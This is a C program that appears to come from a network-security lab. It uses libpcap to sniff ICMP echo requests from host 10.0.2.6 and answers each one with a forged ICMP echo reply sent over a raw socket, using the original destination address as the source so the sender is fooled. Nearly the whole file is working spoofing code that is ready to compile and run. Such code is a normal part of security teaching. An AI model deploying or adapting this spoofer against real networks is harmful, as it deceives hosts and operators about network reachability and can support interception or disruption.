// sniffandspoof.c 
// @author Rishabh Sawhney
// Program to sniff incoming ICMP request packets and spoof ICMP response packets to fool the sender.

#define APP_NAME "sniff"
#include<stdio.h>
#include<pcap.h>
#include<string.h>
#include<stdlib.h>
#include<ctype.h>
#include<errno.h>
#include<sys/time.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<arpa/inet.h>
#include<netinet/ip_icmp.h>
#include<string.h>
#include<netinet/ip.h>
#include<unistd.h>

#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_short th_sport;               /* source port */
        u_short th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

void
print_payload(const u_char *payload, int len);

void
print_hex_ascii_line(const u_char *payload, int len, int offset);

void
print_app_usage(void);

void
print_app_usage(void)
{

	printf("Usage: %s [interface]\n", APP_NAME);
	printf("\n");
	printf("Options:\n");
	printf("    interface    Listen on <interface> for packets.\n");
	printf("\n");

return;
}

/*
 * print data in rows of 16 bytes: offset   hex   ascii
 *
 * 00000   47 45 54 20 2f 20 48 54  54 50 2f 31 2e 31 0d 0a   GET / HTTP/1.1..
 */
void
print_hex_ascii_line(const u_char *payload, int len, int offset)
{

	int i;
	int gap;
	const u_char *ch;

	/* offset */
	printf("%05d   ", offset);
	
	/* hex */
	ch = payload;
	for(i = 0; i < len; i++) {
		printf("%02x ", *ch);
		ch++;
		/* print extra space after 8th byte for visual aid */
		if (i == 7)
			printf(" ");
	}
	/* print space to handle line less than 8 bytes */
	if (len < 8)
		printf(" ");
	
	/* fill hex gap with spaces if not full line */
	if (len < 16) {
		gap = 16 - len;
		for (i = 0; i < gap; i++) {
			printf("   ");
		}
	}
	printf("   ");
	
	/* ascii (if printable) */
	ch = payload;
	for(i = 0; i < len; i++) {
		if (isprint(*ch))
			printf("%c", *ch);
		else
			printf(".");
		ch++;
	}

	printf("\n");

return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void
print_payload(const u_char *payload, int len)
{

	int len_rem = len;
	int line_width = 16;			/* number of bytes per line */
	int line_len;
	int offset = 0;					/* zero-based offset counter */
	const u_char *ch = payload;

	if (len <= 0)
		return;

	/* data fits on one line */
	if (len <= line_width) {
		print_hex_ascii_line(ch, len, offset);
		return;
	}

	/* data spans multiple lines */
	for ( ;; ) {
		/* compute current line length */
		line_len = line_width % len_rem;
		/* print line */
		print_hex_ascii_line(ch, line_len, offset);
		/* compute total remaining */
		len_rem = len_rem - line_len;
		/* shift pointer to remaining bytes to print */
		ch = ch + line_len;
		/* add offset */
		offset = offset + line_width;
		/* check if we have line width chars or less */
		if (len_rem <= line_width) {
			/* print last line and get out */
			print_hex_ascii_line(ch, len_rem, offset);
			break;
		}
	}

return;
}

/*
 * Function to calculate checksum
 */
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	u_short oddbyte;
	register u_short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;	// increase sum by the increasing value of pointer
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char*) &oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return (answer);
}

/*
 * dissect/print packet
 */
void
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	static int count = 1;                   /* packet counter */
	
	/* declare pointers to packet headers */
	const struct sniff_ethernet *ethernet;  /* The ethernet header [1] */
	const struct sniff_ip *ip;              /* The IP header */
	const struct icmphdr *icmp;            	/* The ICMP header */
	const char *payload;                    /* Packet payload */

	int size_ip;
	int size_icmp;
	int size_payload;
	
	u_short icmpID;
	u_short icmpSN;

	printf("\nPacket number %d:\n", count);
	count++;
	
	/* define ethernet header */
	ethernet = (struct sniff_ethernet*)(packet);
	
	/* define/compute ip header offset */
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip)*4;
	if (size_ip < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));
	
	/* determine protocol */	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			//printf("   Protocol: TCP\n");
			return;
		case IPPROTO_UDP:
			//printf("   Protocol: UDP\n");
			return;
		case IPPROTO_ICMP:
			printf("   Protocol: ICMP\n");
			break;
		case IPPROTO_IP:
			//printf("   Protocol: IP\n");
			return;
		default:
			//printf("   Protocol: unknown\n");
			return;
	}
	
	/*
	 *  OK, this packet is ICMP.
	 */
	
	/* define/compute icmp header offset */
		
	icmp = (struct icmphdr*)(packet + SIZE_ETHERNET + size_ip);
	size_icmp = 8;
	if (size_icmp != 8) {
		printf("   * Invalid ICMP header length: %u bytes\n", size_icmp);
		return;
	}
	icmpID = icmp->un.echo.id;
	icmpSN = icmp->un.echo.sequence;

	// printf("   Src port: %d\n", ntohs(tcp->th_sport));
	// printf("   Dst port: %d\n", ntohs(tcp->th_dport));
	
	/* define/compute icmp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_icmp);
	
	/* compute icmp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_icmp);
	
	/*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
	if (size_payload > 0) {
		printf("   Payload (%d bytes):\n", size_payload);
		print_payload(payload, size_payload);
	}
	
	// Spoof the packet
	uint32_t daddr = ip->ip_src.s_addr;
	uint32_t saddr = ip->ip_dst.s_addr;
	int payload_size = size_payload;
	int sent = 0, sent_size;
	
	// raw sockets
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

	if (sockfd < 0)
	{
		perror("could not create socket");
		return;
	}

	int on = 1;

	// Set IP headers (on)
	if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof(on)) == -1)
	{
		perror("setsockopt1");
		return;
	}

	// allow socket to send datagrams to broadcast addresses
	if (setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof(on)) == -1)
	{
		perror("setsockopt2");
		return;
	}
	
	// calculate total packet size and allocate memory in heap for the packet
	int packet_size = /*SIZE_ETHERNET + */sizeof (struct iphdr) + sizeof(struct icmphdr) + payload_size;
	char *response = (char *) malloc(packet_size);
	
	if (!response)
	{
		perror("out of memory");
		close(sockfd);
		return;
	}
	

	// ip header
	//struct sniff_ethernet *new_eth = (struct sniff_ethernet *)response;
	struct iphdr *new_ip = (struct iphdr *)response;// + SIZE_ETHERNET);
	struct icmphdr *new_icmp = (struct icmphdr *)(response /*+ SIZE_ETHERNET*/ + sizeof(struct iphdr));

	// zero out the packet buffer
	memset(response, 0, packet_size);

	
	// set ip info of your choice
	new_ip->version = 4;
	new_ip->ihl = 5;
	new_ip->tos = 0;
	new_ip->tot_len = htons(packet_size);
	new_ip->id = rand();
	new_ip->frag_off = 0;
	new_ip->ttl = 255;
	new_ip->protocol = IPPROTO_ICMP;
	new_ip->saddr = saddr;
	new_ip->daddr = daddr;
	// set the icmp info of your choice
	new_icmp->type = ICMP_ECHOREPLY;
	new_icmp->code = 0;
	new_icmp->un.echo.sequence = icmpSN;
	new_icmp->un.echo.id = icmpID;
	// checksum
	new_icmp->checksum = 0;

	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof(servaddr.sin_zero));
	
	memcpy((u_char *)(response + sizeof(struct iphdr) + sizeof(struct icmphdr)), payload, payload_size);
	
	// recalculate the icmp header checksum since we are fillng the payload with old data characters every time
	new_icmp->checksum = 0;
	new_icmp->checksum = in_cksum((unsigned short*)new_icmp, sizeof(struct icmphdr) + payload_size);
	if (sent_size = sendto(sockfd, response, packet_size, 0, (struct sockaddr*)&servaddr, sizeof(servaddr)) < 1)
	{
		printf("\nsend failed\n");
		free(response);
		close(sockfd);
		return;
	}
	++sent;
	printf("%d packets sent\r", sent);
	fflush(stdout);
	
	free(response);
	close(sockfd);
return;
}

int main(int argc, char *argv[])
{
	
	char *dev = NULL;			/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */

	char filter_exp[] = "icmp and src host 10.0.2.6";		/* filter expression [3] */
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	int num_packets = -1;			/* number of packets to capture */

	//print_app_banner();

	/* check for capture device name on command-line */
	if (argc == 2) {
		dev = argv[1];
	}
	else if (argc > 2) {
		fprintf(stderr, "error: unrecognized command-line options\n\n");
		print_app_usage();
		exit(EXIT_FAILURE);
	}
	else {
		/* find a capture device if not specified on command-line */
		dev = pcap_lookupdev(errbuf);
		if (dev == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n",
			    errbuf);
			exit(EXIT_FAILURE);
		}
	}
	
	// 2. Get network number and mask associated with the device
	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for the device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	/* print capture info */
	printf("Device: %s\n", dev);
	printf("Number of packets: %d\n", num_packets);
	printf("Filter expression: %s\n", filter_exp);

	// 3. Open the device, creating a pcap_t *handle in promiscuous mode
	pcap_t *handle;

	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't open the device %s: %s\n", dev, errbuf);
		return(2);
	}

	// 4. Determine the type of link-layer headers
	if (pcap_datalink(handle) != DLT_EN10MB)
	{
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", dev);
		return(2);
	}

	// 5. Compile the filter expression
	if(pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}

	// 6. Apply the compiled filter
	if(pcap_setfilter(handle, &fp) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(0);
	}

	// 7. Call the callback loop
	pcap_loop(handle, num_packets, got_packet, NULL);

	// Cleanup
	pcap_freecode(&fp);
	pcap_close(handle);

	printf("\nComplete...\n");
	return(0);
}
